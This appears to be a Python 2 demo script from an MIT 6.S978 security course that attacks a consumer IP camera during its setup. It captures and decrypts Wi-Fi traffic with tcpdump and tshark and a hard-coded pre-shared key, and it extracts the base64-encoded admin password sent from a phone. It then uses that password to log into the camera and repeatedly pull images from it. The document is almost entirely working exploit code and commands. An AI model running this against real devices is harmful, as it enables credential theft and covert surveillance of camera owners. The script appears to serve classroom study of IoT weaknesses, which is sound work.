# Clark Wood -- MIT 6.S978, Spring 2016
# Usage: sudo python2.7 demo.py
# 0) Turn on cam and factory reset, get on network, show http://10.255.255.1/image/jpeg.cgi has password
# 1) Turn on program
# 2) Connect smart phone to cam's network, password is: 578d6f48
# 3) Go through prompts until creds sent through
# 4) Decrypt and pull HTTP with tshark
#    tshark -nr test0.pcap -o wlan.enable_decryption:TRUE -o "uat:80211_keys:\"wpa-psk\",\" 95bc9770d399d8180e8cb93098724b91e3cebb13800d0d3e161dd2773da48fbc\"" -Y "http"
# 5) Parse out password
# 6) Send HTTP GET?/POST? request
import base64, os, requests, signal, subprocess, time

tcpdump_cmd = ['./monitor_tcpdump.sh']
pro = subprocess.Popen(tcpdump_cmd, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)

# Keep listening until we're pretty confident we saw the password
while raw_input('stop listening? [y/n]\n') != 'y':
    time.sleep(10) 
os.killpg(os.getpgid(pro.pid), signal.SIGTERM)

# Parse HTTP from PCAP
p = subprocess.Popen(['./tshark.sh'], stdout=subprocess.PIPE)
stdout, stderr = p.communicate()

# Get creds from HTTP traffic
try:
    coded_password = stdout.partition('password=')[2].split()[0] + '='
except IndexError:
    print "Didn't see password. Networking is hard :("
    sys.exit(0)
password = base64.b64decode(coded_password)
print 'Is this your password: {}?'.format(password)

# Take picture
while 1:
    i = raw_input('Shall we take a picture?\n')
    r = requests.post('http://10.255.255.1/image/jpeg.cgi', auth=('admin', password))
    with open('pic.jpeg', 'wb') as f:
        r.raw.decode_content = True
        f.write(r.content)
